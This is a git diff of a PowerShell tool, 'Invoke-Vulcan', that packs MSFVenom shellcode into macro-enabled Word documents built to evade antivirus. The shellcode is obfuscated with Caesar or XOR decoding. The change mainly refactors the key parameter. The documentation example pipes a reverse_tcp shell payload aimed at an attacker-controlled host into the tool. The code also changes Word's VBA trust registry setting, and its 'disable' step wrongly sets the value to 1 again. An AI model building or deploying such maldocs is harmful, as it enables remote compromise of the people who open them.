@@ -12,14 +12,14 @@ function Invoke-Vulcan {
         Using MSFVenom creates a macro-enabled Word document that - at the time
         of writing - evade most AVs, including Windows Defender.
 
-    .PARAMETER Shift
-        Specifies the Caesar shift value to use with the xor decoder.
-
     .PARAMETER Decoder
         Specifies the type of decoder to use, e.g., xor.
 
     .PARAMETER Decoder
         Path to the Visual Basic decoding function.
+
+    .PARAMETER Key
+        Specifies the key to use for the decoder.
 
     .PARAMETER OutputDirectory
         Folder to output files too.
@@ -38,27 +38,20 @@ function Invoke-Vulcan {
   
     .EXAMPLE
         PS C:\>  wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
-        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder caesar -DecoderPath ".\assets\decoders\caesar.vba -Shift 5
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder caesar -DecoderPath ".\assets\decoders\caesar.vba -Key 5
 
         Creates a hex-formatted payload then bundle it into an empty macro-enabled Word document using the indirect template along with the Caesar decoder routine.
     #>
 
     [CmdletBinding(PositionalBinding = $False)]
     param(
-        [ValidateSet("caesar", "xor")]
+        [ValidateSet("Caesar", "XOR")]
         [string]
         $Decoder,
 
         [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
         [String]
         $DecoderPath,
-
-        [ValidateRange(0, 255)]
-        [int]
-        $Shift,
-
-        [String]
-        $Key,
 
         [ValidateScript({ Test-Path -Path $_ -PathType Container })]
         [String]
@@ -80,24 +73,61 @@ function Invoke-Vulcan {
         $Treshold = 72
     )
 
-    $MacroOutput = New-TemporaryFile
-    Resolve-Path `
-        -Path $(Join-Path -Path $OutputDirectory "${OutputPrefix}.$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).doc") `
-        -ErrorAction SilentlyContinue -ErrorVariable _frperror
-    $WordOutput = $_frperror[0].TargetObject
+    DynamicParam {
+        $RuntimeParameterDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
+        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
 
-    Write-Output "[+] Enabling trust access to Visual Basic Project Object Model in Microsoft Word..."
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
+        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute  
+        $ParameterAttribute.Mandatory = $true
 
-    Write-Verbose "Loading (hex-formatted) shellcode..."
-    Create_MacroFromTemplate -Shift $Shift -Decoder $Decoder -DecoderPath $DecoderPath -ShellCode $ShellCode -Template $Template -Treshold $Treshold
-    Create_WordDocument -MacroOutput $MacroOutput -Output $WordOutput
+        $AttributeCollection.Add($ParameterAttribute)
 
-    Write-Output "[-] Removing (Visual Basic) macro file..."
-    Remove-Item -Path $MacroOutput -Force
+        $ParameterName = "Key"
+
+        switch ($Decoder) {
+            "Caesar" {
+                $ValidateRangeAttribute = New-Object System.Management.Automation.ValidateRangeAttribute(0, 255)
+                $AttributeCollection.Add($ValidateRangeAttribute)
+
+                $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ParameterName, [int], $AttributeCollection)
+
+            }
+            "XOR" {
+                $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ParameterName, [string], $AttributeCollection)
+
+            }
+        }
+
+        $RuntimeParameterDictionary.Add($ParameterName, $RuntimeParameter)
+
+        return $RuntimeParameterDictionary
+    }
+
+    begin {
+        $Key = $PsBoundParameters[$ParameterName]
+
+        $MacroOutput = New-TemporaryFile
+        Resolve-Path `
+            -Path $(Join-Path -Path $OutputDirectory "${OutputPrefix}.$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).doc") `
+            -ErrorAction SilentlyContinue -ErrorVariable _frperror
+        $WordOutput = $_frperror[0].TargetObject
+    }
+
+    process {
+        Write-Output "[+] Enabling trust access to Visual Basic Project Object Model in Microsoft Word..."
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
+
+        Write-Verbose "Loading (hex-formatted) shellcode..."
+        Create_MacroFromTemplate -Key $Key -Decoder $Decoder -DecoderPath $DecoderPath -ShellCode $ShellCode -Template $Template -Treshold $Treshold
+        Create_WordDocument -MacroOutput $MacroOutput -Output $WordOutput
+    }
+    end {
+        Write-Output "[-] Removing (Visual Basic) macro file..."
+        Remove-Item -Path $MacroOutput -Force
         
-    Write-Output "[+] Disabling trust access to Visual Basic Project Object Model in Microsoft Word..."
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
+        Write-Output "[-] Disabling trust access to Visual Basic Project Object Model in Microsoft Word..."
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
+    }
 }
 
 function Format-HexArray($HexArray, $Treshold) {
@@ -147,22 +177,22 @@ function Convert-HexToHexArray($ShellCode, $Treshold) {
     return $Payload.Substring(0, $Payload.Length - 1) 
 }
 
-function Create_MacroFromTemplate($Shift, $Decoder, $DecoderPath, $ShellCode, $Template, $Treshold) {
+function Create_MacroFromTemplate($Decoder, $DecoderPath, $Key, $ShellCode, $Template, $Treshold) {
     Write-Verbose "Creating (Visual Basic) macro..."
     $PayloadArray = Convert-HexToHexArray -ShellCode $ShellCode -Treshold $Treshold
     Write-Debug "Create_MacroFromTemplate->`$PayloadArray: $PayloadArray"
 
     switch ($Decoder) {
-        "caesar" {
+        "Caesar" {
             Write-Verbose "[i] Adding the $Decoder decoding routine"
 
             Set-Content -Path $MacroOutput -Value (
                 Get-Content -Path $Template).Replace(
                 "PAYLOAD", "Array(" + $PayloadArray + ')' + 
-                "`r`n" + "`r`n" + "`t" + "kUG HoR, " + $Shift)
+                "`r`n" + "`r`n" + "`t" + "kUG HoR, " + $Key)
             Add-Content -Path $MacroOutput -Value (Get-Content -Path $DecoderPath)
         }
-        "xor" {
+        "XOR" {
             Write-Verbose "[i] Adding the $Decoder decoding routine"
 
             Set-Content -Path $MacroOutput -Value (
